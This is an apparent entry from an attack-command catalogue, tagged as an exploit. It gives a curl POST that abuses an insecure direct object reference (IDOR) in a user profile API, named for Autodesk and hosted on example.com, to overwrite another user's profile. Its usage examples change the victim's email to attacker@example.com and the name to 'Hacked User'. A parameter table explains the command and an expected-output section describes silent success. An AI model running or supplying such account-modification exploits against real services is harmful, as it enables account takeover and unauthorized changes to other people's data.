---
id: cmd-uuid-3456
data: >-
  curl -X POST
  "https://autodesk-api.example.com/api/user/profile?id=TARGET_USER_ID" -H
  "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d
  '{"email": "attacker@example.com", "name": "Modified Name"}'
tags:
  - api
  - exploit
  - idor
  - modification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.576Z'
verified: false
validated: true
submitted: true
---
# curl-idor-profile-modify

## Command

```bash
curl -X POST "https://autodesk-api.example.com/api/user/profile?id=TARGET_USER_ID" -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"email": "attacker@example.com", "name": "Modified Name"}'
```

## Description

This command uses curl to send a POST request to the Autodesk User Profile API with a manipulated 'id' parameter and modified payload, exploiting IDOR to update another user's profile without authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL with ?id=TARGET_USER_ID` | The API endpoint URL with the target user ID | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication header | Yes |
| `-H "Content-Type: application/json"` | Content type header | Yes |
| `-d 'JSON_PAYLOAD'` | The JSON data to update the profile (e.g., email, name) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://autodesk-api.example.com/api/user/profile?id=12346" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" -d '{"email": "new@example.com"}'
```

### Advanced Usage

```bash
curl -X POST "https://autodesk-api.example.com/api/user/profile?id=12346" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" -d '{"email": "attacker@example.com", "name": "Hacked User", "phone": "123-456-7890"}'
```

## Expected Output

Successful execution returns a 200 OK with updated profile JSON, e.g., {"success": true, "profile": {"id": "12346", "email": "attacker@example.com"}}. Failure may return 403 or 400 if validation exists, but vulnerability allows silent updates.

## Related

- [[Related Procedure: Exploit-IDOR-in-User-Profile-API]]
